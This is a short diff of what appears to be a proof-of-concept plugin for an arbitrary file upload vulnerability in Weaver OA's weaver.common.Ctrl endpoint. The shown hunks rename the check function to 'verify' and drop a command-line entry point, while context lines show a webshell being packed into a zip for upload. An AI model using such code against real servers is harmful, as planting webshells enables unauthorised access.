@@ -12,7 +12,7 @@ def file_zip(mm, webshell_name2):
     zf.writestr(webshell_name2, shell)
 
 #mm = generate_random_str(8)
-def weaver_common_ctrl_upload(urllist):
+def verify(urllist):
     relsult = {
         'name': '泛微OA weaver.common.Ctrl 任意文件上传漏洞',
         'vulnerable': False
@@ -42,7 +42,3 @@ def weaver_common_ctrl_upload(urllist):
         return relsult
 
 
-
-if __name__ == '__main__':
-    url = input('url:')
-    print(weaver_common_ctrl_upload(url))
